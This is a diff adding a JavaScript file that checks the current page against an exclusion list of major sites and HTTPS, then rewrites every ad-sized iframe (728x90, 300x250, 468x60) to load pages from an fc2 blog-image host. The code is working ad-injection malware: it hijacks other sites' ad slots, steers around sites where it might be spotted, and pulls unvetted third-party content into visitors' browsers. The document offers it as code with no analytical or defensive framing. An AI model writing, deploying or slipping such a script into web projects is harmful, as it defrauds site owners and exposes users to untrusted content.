@@ -1,0 +1,72 @@
+function validHost1() {
+    if (location.href.match(/static\.ak\./i)) {
+        return false
+    } else if ("https:" == document.location.protocol) {
+        return false
+    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
+        return false
+    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
+        return false
+    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
+        return false
+    } else if (location.href.match(/blank/i)) {
+        return false
+    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
+        return false
+    } else if (location.href.match(/^\.hotmail\.com\//i)) {
+        return false
+    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
+        return false
+    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
+        return false
+    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
+        return false
+    } else if (location.href.match(/goojue\.com/i)) {
+        return false
+    } else if (location.href.match(/youtube\.com/i)){
+        return false
+    }
+      else if (location.href.match(/google\.com/i)){
+        return false
+    } 
+      else if (location.href.match(/bligoo\.pe/i)){
+        return false
+    } 
+      else if (location.href.match(/google\.es/i)){
+        return false
+    }
+      else if (location.href.match(/submanga\.com/i)){
+        return false
+    }
+      else if (location.href.match(/google\.com\.mx/i)){
+        return false
+    }
+      else if (location.href.match(/google\.com\.ar/i)){
+        return false
+    }  else {
+        return true
+    } 
+}
+
+
+
+
+function otranet(a) {
+    if (a.width == "728" && a.height == "90") {
+        a.src = "http://blog-imgs-57.fc2.com/i/n/k/inkanimehd/inka728x90.html"
+    } else if (a.width == "300" && a.height == "250") {
+        a.src = "http://blog-imgs-57.fc2.com/i/n/k/inkanimehd/inka300x250.html"
+    } else if (a.width == "468" && a.height == "60") {
+        a.src = "http://blog-imgs-57.fc2.com/i/n/k/inkanimehd/inka468x60.html"
+    }
+    return true
+}
+if (validHost1()) {
+    var iframes = document.getElementsByTagName("iframe");
+    for (var i = 0; i < iframes.length; i++) {
+        iframe = iframes[i].src;
+        otranet(iframes[i])
+    }
+}
+
+
